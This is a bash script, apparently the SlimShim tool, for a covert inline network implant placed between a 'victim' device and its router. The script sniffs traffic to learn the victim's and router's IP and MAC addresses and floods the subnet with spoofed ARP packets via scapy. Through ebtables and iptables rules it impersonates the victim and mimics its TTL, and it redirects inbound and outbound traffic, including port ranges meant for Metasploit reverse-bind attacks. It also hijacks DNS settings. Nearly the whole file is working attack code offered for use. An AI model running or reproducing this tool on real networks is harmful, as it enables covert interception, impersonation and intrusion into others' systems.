#!/bin/bash
# 20191007 Kirby

################################################################################
# LICENSE
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
################################################################################

# To check script sanity, run:
##shellcheck -e SC2086,SC2001 slimshim

################################################################################
function do_guess() 
{
    local sniff
    local sip
    local rip
    local rmac
    local smac
    local led
    local dev='eth1'
    local dirarg
    local netguess
    local ttl
    local vlan
    local tcpdumpcmd
    local scapy=0
    local dumpargs="tcp and not ether src ${ARGS[mymac]} and not ether dst ${ARGS[mymac]} and not ether src ff:ff:ff:ff:ff:ff and not ether dst ff:ff:ff:ff:ff:ff and not port 68 and not port 67 and not port 137 and not port 139 and not ip6 and not host ${ARGS[myip]} and not net 224.0.0.0/4 and not net 169.254.0.0/16 and not host 0.0.0.0"

    # We are going to look for inbound packets on eth1 where the victim device should be plugged in
    # OpenWRT's tcpdump uses -P for direction.  Other distros use -Q
    tcpdump --help 2>&1 |grep -q '\-P' && dirarg='-P in'
    tcpdump --help 2>&1 |grep -q '\-Q' && dirarg='-Q in'

    # eth0.2 on the Nexx WT3020 is in the center of the device.  Plug that interface into the victim.
    if ip link show eth1 >/dev/null 2>&1
    then
        dev=eth1
    elif ip link show eth0.2 >/dev/null 2>&1
    then
        dev=eth0.2
    else
        echo "FATAL ERROR: you are missing either eth1 or eth0.2"
        exit 1
    fi

    while :
    do
        # Determine the victim's IP/MAC by watching inbound packets on the interface.
        # It is critical that eth1 be plugged directly into the victim.
        tcpdumpcmd="tcpdump -v -c1 -e -nni $dev $dirarg $dumpargs"
        echo "############################################"
        echo "# running $tcpdumpcmd"
        echo "############################################"
        sniff=$($tcpdumpcmd 2>/dev/null)
        echo "############################################"
        echo "# PACKET: $sniff"
        echo "############################################"
        sip=$(echo $sniff |sed -e 's/.* \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]* > .*/\1/')
        smac=$(echo $sniff |awk '{print $2}')
        ttl=$(echo $sniff |sed -e 's/.* ttl \([0-9]*\), .*/\1/')

        # Sanity checks
        if ! echo $sip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
        then
            echo "# BAD SIP $sip"
            echo "# Gonna loop again"
            continue
        fi
        if ! echo $smac |egrep -q "^[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+:[0-9a-f]+$"
        then 
            echo "# BAD SMAC $smac"
            echo "# Gonna loop again"
            continue
        fi
        if ! echo $ttl |egrep -q "^[0-9]+$"
        then 
            echo "# BAD TTL $ttl"
            echo "# Gonna loop again"
            continue
        fi
        if [[ $ttl -lt 64 ]]
        then
            echo "# WARNING: ttl $ttl is probably not right.  This may be a bad sniff.  Setting to 64"
            ttl=64
        fi

        # Detect if this is an 802.1q network and grab the vlan id.
        if echo $sniff |grep -q ' vlan '
        then
            vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
            if ! echo $vlan |egrep -q "^[0-9]+$"
            then 
                echo "# WTF.  Bad vlan $vlan.  Gonna ignore and not set the vlan."
                vlan=''
            fi
        else
            vlan=''
        fi

        echo "sip=$sip"
        echo "smac=$smac"
        echo "ttl=$ttl"
        echo "vlan=$vlan"

        # Now sniff for packets with a non-default ttl to get router mac.  Anything that hopped has decremented ttl.
        # Also assume that network is /24 and ignore local traffic as an extra precaution.
        netguess="${sip%.*}.0"
        echo "netguess=$netguess/24"
        tcpdumpcmd="tcpdump -c1 -v -e -nni br-lan dst host $sip and not src net $netguess/24 and ip[8] != 64 and ip[8] != 128 and $dumpargs"
        echo "############################################"
        echo "# running $tcpdumpcmd"
        echo "############################################"
        sniff=$($tcpdumpcmd 2>/dev/null)
        echo "############################################"
        echo "# PACKET: $sniff"
        echo "############################################"
        rmac=$(echo $sniff |awk '{print $2}')
        echo "rmac=$rmac"

        if [[ "$smac" == "$rmac" ]]
        then
            echo "############################################"
            echo "# BAD DATA"
            echo "# $sniff"
            echo "############################################"
        else
            break
        fi
    done


    echo "# Getting routerip."
    echo "# Wait until victim arp queries the router mac"
    echo "#      OR unplug and replug ethernet (to victim) to run quicker"
    while :
    do
        # Do a 1 second off, 2 seconds on blink of power led
        if [[ -f "/sys/class/leds/nexx:blue:power/brightness" ]]
        then
            led="/sys/class/leds/nexx:blue:power/brightness"
            touch /tmp/blink
            blinkled $led &
        fi
        
        # On some devices you can run ip link dev down/up to simulate the unplug, but it will break on OpenWRT/LEDE
        if grep -q Kali /etc/os-release 2>/dev/null
        then
            echo "#"
            echo "# Turning off/on interfaces to speed this up"
            echo "# This will only work on hosts using dhcp"
            echo "# Disable this in the script if your device becomes unresponsive"
            ip link set dev eth1 down
            sleep 1
            ip link set dev eth1 up
        fi

        # Send arp request via scapy if we have it.
        # Background it so we can catch it on the next tcpdump
        # YOU MAY WANT TO DISABLE THIS.  
        # This will flood the guessed network with arp requests in hopes of finding the router ip to match the route mac
        if which scapy >/dev/null 2>&1
        then
            scapy=1
            echo "# Sending arp via scapy to the assumed network $netguess/24"
            if [[ x$vlan != 'x' ]]
            then
                ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/Dot1Q(vlan=$vlan)/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
            else
                ( sleep 3;  echo "srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='$netguess/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')" |scapy >/dev/null 2>&1 ) &
            fi
        fi

        # 21:33:32.482541 ARP, Reply 192.168.1.1 is-at 68:05:ca:32:5e:85, length 46
        echo "#"
        echo "# You may want to spoof arp requests with scapy"
        echo "# Run this in another terminal:"
        echo "# echo \"srp(Ether(dst='ff:ff:ff:ff:ff:ff',src='$smac')/ARP(pdst='####GUESSTHENETWORK####/24',psrc='$sip',hwsrc='$smac'),timeout=30,iface='br-lan')\" |scapy"
        echo "#"
        sniff=$(tcpdump -c1 -nni br-lan ether src $rmac and arp 2>/dev/null)
        rip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
        if [[ "$rip" == "$sip" ]]
        then
            echo "############################################"
            echo "# BAD DATA"
            echo "# $sniff"
            echo "############################################"
        elif echo $rip |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
        then
            echo "#"
            echo "# PACKET: $sniff"
            echo "#"
            if [[ $scapy == 1 ]]
            then
                kill %1 >/dev/null 2>&1
            fi
            break
        fi
        echo "############################################"
        echo "# Something went wrong.  Gonna loop"
        echo "# $sniff"
        echo "############################################"
    done
    if [[ $scapy == 1 ]]
    then
        kill %1 >/dev/null 2>&1
    fi
    if [[ -f "/tmp/blink" ]]
    then
        rm /tmp/blink
        echo 0 > $led
    fi
    echo "rip=$rip"

    ARGS[rip]=$rip
    ARGS[rmac]=$rmac
    ARGS[sip]=$sip
    ARGS[smac]=$smac
    ARGS[ttl]=$ttl
    ARGS[vlan]=$vlan
}
################################################################################
function blinkled() 
{
    local ledfile=$1
    while [[ -f /tmp/blink ]]
    do
        echo 1 > $ledfile
        sleep 1
        echo 0 > $ledfile
        sleep 2
    done
}
################################################################################
function do_getdns() 
{
    local dns
    local sniff

    # Disable dnsmasq because it will overwrite our settings
    /etc/init.d/dnsmasq stop >/dev/null 2>&1
    systemctl stop dnsmasq >/dev/null 2>&1
    service dnsmasq stop >/dev/null 2>&1
    pkill dnsmasq >/dev/null 2>&1
    sleep 1

    # First add Google DNS so we can do resolution before we see requests
    rm -rf /etc/resolv.conf >/dev/null 2>&1
    echo 'nameserver 8.8.8.8' > /etc/resolv.conf

    # Loop the sniffer until we have a valid IP and make it the primary nameserver
    while ! echo $dns |egrep -q "^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$"
    do
        sniff=$(tcpdump -c1 -nni br-lan "not ip6 and udp and dst port 53" 2>/dev/null)
        # 04:40:30.876500 IP 192.168.1.19.59369 > 192.168.1.1.53: 13937+ A? cnn.com. (25)
        dns=$(echo $sniff |sed -e 's/.* > \([0-9]*\.[0-9]*\.[0-9]*\.[0-9]*\)\.[0-9]*: .*/\1/')
        if ! grep -q $dns /etc/resolv.conf
        then
            echo "nameserver $dns" > /etc/resolv.conf
        fi
        if ! grep -q 8.8.8.8 /etc/resolv.conf
        then
            echo "nameserver 8.8.8.8" >> /etc/resolv.conf
        fi
    done
}
################################################################################
function do_arpwatch()
{
    local ip
    local mac
    local vlan
    local sniff
    local brdev

    # This is a forever loop.  
    # We continuously watch for arps and add to the arptable and route table.
    while :
    do
        # Continuosly check for br-lan in case shim is stopped or restarted.
        if brctl show |grep -q br-lan
        then
            tcpdump -v -e -nni br-lan arp 2>/dev/null | while read sniff; do
            ip=''
            mac=''
            if echo $sniff |grep -q ' vlan '
            then
                vlan=$(echo $sniff |sed -e 's/.* vlan \([0-9]*\), .*/\1/')
                brdev="br-lan.$vlan"
            else
                vlan=''
                brdev='br-lan'
            fi
            if echo $sniff |grep -q is-at
            then
                mac=$(echo $sniff |sed -e 's/.* is-at \(.*\), .*/\1/')
                ip=$(echo $sniff |sed -e 's/.* Reply \(.*\) is-at .*/\1/')
            fi
            if echo $sniff |grep -q who-has
            then
                mac=$(echo $sniff |awk '{print $2}')
                ip=$(echo $sniff |sed -e 's/.* tell \(.*\), .*/\1/')
            fi
            if [[ -n $ip                      ]] \
            && [[ -n $mac                     ]] \
            && [[ $ip  != "${ARGS[myip]}"     ]] \
            && [[ $ip  != '0.0.0.0'           ]] \
            && [[ $mac != "${ARGS[mymac]}"    ]] \
            && [[ $mac != 'ff:ff:ff:ff:ff:ff' ]]
            then
                if ! ip neigh |egrep  "^$ip " |grep -q $mac
                then
                    echo $sniff
                    echo "adding arp for $ip at $mac"
                    ip neigh replace $ip lladdr $mac dev $brdev >/dev/null 2>&1
                    route add $ip dev $brdev >/dev/null 2>&1
                    echo ""
                fi
            fi
		    done
        else
            # May be waiting for shim to complete.
            # Sleep and try again.
            sleep 1
        fi
    done
}
################################################################################
# redirect outbound traffic from victim($sip) to destination($dip)
function redirectEgressIP()
{
    if [[ -z ${ARGS[newdip]} ]]
    then
        ARGS[newdip]=${ARGS[myip]}
    fi
    if [[ -z ${ARGS[sip]}     ]] \
    || [[ -z ${ARGS[origdip]} ]] \
    || [[ -z ${ARGS[newdip]}  ]] \
    || [[ -z ${ARGS[mymac]}   ]]
    then
        echo "FAILURE: invalid args"
        exit 1
    fi
    set -x
    iptables -t nat -A PREROUTING -s ${ARGS[sip]} -d ${ARGS[origdip]} -p tcp -j DNAT --to-destination ${ARGS[newdip]}
    set +x
}
################################################################################
# redirect outbound traffic from victim($sip) to destination($dip) for port $dstport
function redirectEgressPort()
{
    if [[ -z ${ARGS[dstport]} ]] \
    || [[ -z ${ARGS[proto]}   ]] \
    || [[ -z ${ARGS[sip]}     ]] \
    || [[ -z ${ARGS[origdip]} ]] \
    || [[ -z ${ARGS[newdip]}  ]] \
    || [[ -z ${ARGS[mymac]}   ]]
    then
        echo "FAILURE: invalid args"
        exit 1
    fi
    set -x
    iptables -t nat -A PREROUTING -s ${ARGS[sip]} -d ${ARGS[origdip]} -p ${ARGS[proto]} -m ${ARGS[proto]} --dport ${ARGS[dstport]} -j DNAT --to-destination ${ARGS[newdip]}:${ARGS[dstport]}
    set +x
}
################################################################################
# redirect traffic going to victim IP($sip) on $rdrport to the SlimShim on $dstport
function redirectIngressPort() 
{
    if [[ -z ${ARGS[proto]}   ]] \
    || [[ -z ${ARGS[sip]}     ]] \
    || [[ -z ${ARGS[rdrport]} ]] \
    || [[ -z ${ARGS[dstport]} ]] \
    || [[ -z ${ARGS[myip]}    ]] \
    || [[ -z ${ARGS[mymac]}   ]]
    then
        echo "FAILURE: invalid args"
        exit 1
    fi
    set -x
    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p ${ARGS[proto]} -m ${ARGS[proto]} --dport ${ARGS[rdrport]} -j DNAT --to-destination ${ARGS[myip]}:${ARGS[dstport]}
    set +x
}
################################################################################
# redirect multiple ports(begin:end) to SlimShim.  Useful for reverse-bind attacks in Metasploit
function redirectIngressPorts() 
{
    if [[ -z ${ARGS[proto]}   ]] \
    || [[ -z ${ARGS[sip]}     ]] \
    || [[ -z ${ARGS[rdrport]} ]] \
    || [[ -z ${ARGS[dstport]} ]] \
    || [[ -z ${ARGS[myip]}    ]] \
    || [[ -z ${ARGS[mymac]}   ]]
    then
        echo "FAILURE: invalid args"
        exit 1
    fi
    set -x
    iptables -t nat -A PREROUTING ! -s $myip -d $sip -p $proto -m $proto -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination $myip
    set +x
}
################################################################################
# add a lan to the shim, e.g. wifi or openvpn on the SlimShim device
function addLan() 
{
    if [[ -z ${ARGS[lan]}      ]] \
    || [[ -z ${ARGS[sip]}      ]] \
    || [[ -z ${ARGS[rip]}      ]] \
    || [[ -z ${ARGS[dynports]} ]]
    then
        echo "FAILURE: invalid args"
        exit 1
    fi
    set -x
    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[lan]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}
    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[lan]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}
    set +x
}
################################################################################
function do_usage()
{
    cat <<EOF
########
WARNING: YOU MUST PLUG THE VICTIM DEVICE INTO ETH1 (ETH0.2 ON NEXX SHIMS)
########

To shim a box:
$0 shim --smac=<victim mac> --sip=<victim ip> --rmac=<router mac> --rip=<routerip>

To prepare SlimShim with a bridge (automatically done when shim/autoshim is run)
$0 prep

Guess the IP/MAC of victim and router
$0 guess

Guess the IP/MAC of victim and router and then run the shim
$0 autoshim

Watch for arps and populate arp table.  
This is absolutely required after the shim is run, otherwise your SlimShim will not be able to connect to anything.
I recommend you run this in screen: screen -dmS arpwatch $0 arpwatch
$0 arpwatch

Add my wifi network so I can route through the SlimShim (192.0.0.0/24 is an RFC 5736 private network)
$0 addLan --lan=192.0.0.0/24 --envfile=/root/slimshim.env 

Redirect inbound 2501 to ssh on SlimShim
$0 redirectIngressPort --proto=tcp --rdrport=2501 --dstport=22 --envfile=/root/slimshim.env 

Redirect outbound to 1.1.1.1 to SlimShim
$0 redirectEgressIP --origdip=1.1.1.1 --envfile=/root/slimshim.env 

Redirect outbound to bing.com for http to google.com
$0 redirectEgressPort --envfile=/root/slimshim.env --origdip=204.79.197.200 --newdip=172.217.4.110 --proto=tcp --dstport=80

Watch for DNS requests and update resolv.conf
Google DNS is hardcoded in this function, so remove it if you don't like it.
screen -dmS getdns $0 getdns


EOF
    exit 1
}
################################################################################
function do_envwrite()
{
    # Write variables to env file
    local envfile="/root/slimshim.env"
    rm -f $envfile 2>/dev/null
    for i in "${!ARGS[@]}"
    do
        echo "$i=${ARGS[$i]}" >>$envfile
        echo "ARGS[$i]=${ARGS[$i]}" >>$envfile
    done
}
################################################################################
function do_clearall() 
{
    ebtables -t filter -F >/dev/null 2>&1
    iptables -t filter -F >/dev/null 2>&1
    ebtables -t nat -F >/dev/null 2>&1
    iptables -t nat -F >/dev/null 2>&1
    iptables -t mangle -F >/dev/null 2>&1
    iptables -t raw -F >/dev/null 2>&1
}
################################################################################
function do_runprep() 
{
    local gotofail=0
    local int1
    local int2

    do_clearall
    if ! which ip iptables ebtables modprobe brctl route ifconfig sysctl >/dev/null 2>&1 
    then
        echo "FATAL ERROR: you are missing one or more commands"
        echo "Make sure the following commands are in your path:"
        echo "ip iptables ebtables modprobe brctl route ifconfig sysctl"
        exit 1
    fi
    modprobe arptable_filter >/dev/null 2>&1
    modprobe br_netfilter >/dev/null 2>&1

    sysctl -w net.bridge.bridge-nf-call-arptables=1 >/dev/null 2>&1 || gotofail=1
    sysctl -w net.bridge.bridge-nf-call-ip6tables=1 >/dev/null 2>&1 || gotofail=1
    sysctl -w net.bridge.bridge-nf-call-iptables=1 >/dev/null 2>&1 || gotofail=1

    # ADJUST FOR THE INTERFACES YOU HAVE
    # NEXX devices only have eth0.1 and eth0.2
    # WARNING: OpenWRT/LEDE devices will fail if you haven't configured the interfaces to tag with the cpu interface
    if ip link show eth1 >/dev/null 2>&1
    then
        int1=eth0
        int2=eth1
    elif ip link show eth0.2 >/dev/null 2>&1
    then
        int1=eth0.1
        int2=eth0.2
    else
        echo "FATAL ERROR: you are missing either eth1 or eth0.2"
        exit 1
    fi
    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d ff:ff:ff:ff:ff:ff -j DROP >/dev/null 2>&1
    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d 01:00:5e:00:00:01 -j DROP >/dev/null 2>&1
    ebtables -t filter -A OUTPUT -s ${ARGS[mymac]} -d 33:33:00:00:00:01 -j DROP >/dev/null 2>&1

    ifconfig $int1 -arp up
    ifconfig $int2 -arp up
    if ! brctl show br-lan 2>&1 |grep -q "No such device" 
    then
        brctl addbr br-lan
        brctl addif br-lan $int1
        brctl addif br-lan $int2
    fi
    ifconfig br-lan ${ARGS[myip]} netmask 255.255.255.0 -arp up || gotofail=1
    ip link set dev br-lan address ${ARGS[mymac]} arp off || gotofail=1
    #route add default dev br-lan >/dev/null 2>&1

    while ip route |grep -q default
    do
        defaultroute=$(ip route |grep default |head)
        ip route delete $defaultroute >/dev/null 2>&1
    done

    if [[ $gotofail == 1 ]]
    then
        echo "FATAL ERROR: do_runprep function failed"
        exit 1
    fi
}
################################################################################
function do_autoshim()
{
    do_runprep
    do_guess
    do_shim
}
################################################################################
function do_shim()
{
    local brdev
    local gotofail=0

    # just to make sure we're ready
    do_runprep
    
    if [[ -n ${ARGS[vlan]} ]]
    then
        modprobe 8021q >/dev/null 2>&1
        if ! lsmod |grep -q 8021q
        then
            echo "ALERT: did not see 8021q kernel module via lsmod"
            echo "I hope you have it compiled in the kernel."
            echo "Proceeding anyways.  Watch out for failures."
        fi
        brdev="br-lan.${ARGS[vlan]}"
        #vconfig add br-lan ${ARGS[vlan]}
        ip link add link br-lan name $brdev type vlan id ${ARGS[vlan]}
        ip link set dev $brdev up || gotofail=1
        ifconfig br-lan 169.254.99.99/32 -arp up || gotofail=1
        ifconfig $brdev ${ARGS[myip]} netmask 255.255.255.0 -arp up || gotofail=1
    else
        brdev="br-lan"
    fi
    ARGS[brdev]=$brdev

    if [[ $gotofail == '1' ]]
    then
        echo "FATAL ERROR: do_shim function failed"
        exit 1
    fi

    set -x
    # slimshim going out
    ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
    if [[ -n ${ARGS[vlan]} ]]
    then
        ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} ! -d ${ARGS[smac]} -j snat --to-source ${ARGS[smac]}
    fi
    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[myip]} ! -d ${ARGS[sip]} -j SNAT --to ${ARGS[sip]}
    
    # slimshim going to victim
    ebtables -t nat -A POSTROUTING -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
    if [[ -n ${ARGS[vlan]} ]]
    then
        ebtables -t nat -A POSTROUTING -p 0x8100 -s ${ARGS[mymac]} -d ${ARGS[smac]} -j snat --to-source ${ARGS[rmac]}
    fi
    iptables -t nat -A POSTROUTING -p tcp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p udp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}:${ARGS[dynports]}
    iptables -t nat -A POSTROUTING -p icmp -s ${ARGS[myip]} -d ${ARGS[sip]} -j SNAT --to ${ARGS[rip]}
    
    # outside to victim
    if [[ -n ${ARGS[vlan]} ]]
    then
        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[smac]} -d ${ARGS[rmac]} -j dnat --to-destination ${ARGS[mymac]}
        ebtables -t nat -A PREROUTING -p 0x8100 --vlan-encap 0x0800 -s ${ARGS[rmac]} -d ${ARGS[smac]} -j dnat --to-destination ${ARGS[mymac]}
    else
        # EXPERIMENTAL
        #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto tcp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
        #ebtables -t nat -A PREROUTING -p 0x0800 --ip-proto udp --ip-destination ${ARGS[sip]} --ip-destination-port=${ARGS[rdrports]} -j dnat --to-destination ${ARGS[mymac]}
        true
    fi

    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p tcp -m tcp -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination ${ARGS[myip]}
    iptables -t nat -A PREROUTING ! -s ${ARGS[myip]} -d ${ARGS[sip]} -p udp -m udp -m multiport --dports ${ARGS[rdrports]} -j DNAT --to-destination ${ARGS[myip]}
    
    # victim going to slimshim
    ip neigh replace ${ARGS[sip]} lladdr ${ARGS[smac]} dev $brdev >/dev/null 2>&1
    ip neigh replace ${ARGS[rip]} lladdr ${ARGS[rmac]} dev $brdev >/dev/null 2>&1
    
    # mimic the ttl
    # Note: this will fail on OpenWRT/LEDE until they upgrade
    if [[ -n ${ARGS[ttl]} ]]
    then
        iptables -t mangle -A POSTROUTING -o $brdev -j TTL --ttl-set ${ARGS[ttl]}
    fi

    ip route add ${ARGS[sip]} dev $brdev >/dev/null 2>&1
    ip route add ${ARGS[rip]} dev $brdev >/dev/null 2>&1
    ip route add default via ${ARGS[rip]} dev $brdev >/dev/null 2>&1
    set +x

    do_envwrite
}
################################################################################


################################################################################
################################################################################
# MAIN
################################################################################
################################################################################

if ! id |grep -q uid=0
then
    echo "You must be root to run this"
    exit 1
fi

if ! which tcpdump awk sed cut grep egrep >/dev/null 2>&1
then
    echo "# FAIL: you must install the following: tcpdump awk sed cut grep egrep"
    exit 1
fi

# Kali broke ebtables, but left the legacy
if which ebtables-legacy >/dev/null 2>&1
then
    alias ebtables=ebtables-legacy
fi

case $1 in
    shim)
        COMMAND=do_shim
        shift
        ;;
    prep)
        COMMAND=do_runprep
        shift
        ;;
    guess)
        COMMAND=do_guess
        shift
        ;;
    autoshim)
        COMMAND=do_autoshim
        shift
        ;;
    arpwatch)
        COMMAND=do_arpwatch
        shift
        ;;
    getdns)
        COMMAND=do_getdns
        shift
        ;;
    undo)
        COMMAND=do_clearall
        shift
        ;;
    redirectEgressIP)
        COMMAND=redirectEgressIP
        shift
        ;;
    redirectEgressPort)
        COMMAND=redirectEgressPort
        shift
        ;;
    redirectIngressPort)
        COMMAND=redirectIngressPort
        shift
        ;;
    redirectIngressPorts)
        COMMAND=redirectIngressPorts
        shift
        ;;
    addLan)
        COMMAND=addLan
        shift
        ;;
    *)
        do_usage
        shift
        ;;
esac

declare -A ARGS
for i in "$@"
do
    case $i in
        --smac=*)
            ARGS[smac]="${i#*=}"
            shift
            ;;
        --sip=*)
            ARGS[sip]="${i#*=}"
            shift
            ;;
        --rmac=*)
            ARGS[rmac]="${i#*=}"
            shift
            ;;
        --rip=*)
            ARGS[rip]="${i#*=}"
            shift
            ;;
        --proto=*)
            ARGS[proto]="${i#*=}"
            shift
            ;;
        --rdrport=*)
            ARGS[rdrport]="${i#*=}"
            shift
            ;;
        --dstport=*)
            ARGS[dstport]="${i#*=}"
            shift
            ;;
        --origdip=*)
            ARGS[origdip]="${i#*=}"
            shift
            ;;
        --newdip=*)
            ARGS[newdip]="${i#*=}"
            shift
            ;;
        --lan=*)
            ARGS[lan]="${i#*=}"
            shift
            ;;
        --vlan=*)
            ARGS[vlan]="${i#*=}"
            shift
            ;;
        --help|-h|--usage)
            do_usage
            shift
            ;;
        --envfile=*)
            envfile="${i#*=}"
            if [[ -f "$envfile" ]]
            then
                . "$envfile"
            else
                echo "No env file $envfile"
            fi
            shift
            ;;
        *)
            echo "#########################"
            echo "# I don't know what $i is"
            echo "#########################"
            do_usage
            exit 1
            ;;
    esac
done

ARGS[myip]='169.254.0.1'
ARGS[mymac]='0:1:1:1:1:1'

# rdrports must overlap with dynports.  Dynports are for source ports on egress connections.  Rdrports will be redirected to $myip.
ARGS[dynports]='27000-32000'
ARGS[rdrports]='27000:32000'
# $dynports needs '-' and $rdrports needs ':'.   Blame it on netfilter.

if [[ $COMMAND == 'do_shim' ]]
then
    if [[ -z $sip  ]] \
    || [[ -z $smac ]] \
    || [[ -z $rip  ]] \
    || [[ -z $rmac ]]
    then
        echo "FAILURE: missing arguments"
        exit 1
    fi
fi

# execute function set in $1
$COMMAND

#echo "# ARGS:"
#for i in "${!ARGS[@]}"; do
#    echo "$i=${ARGS[$i]}"
#done



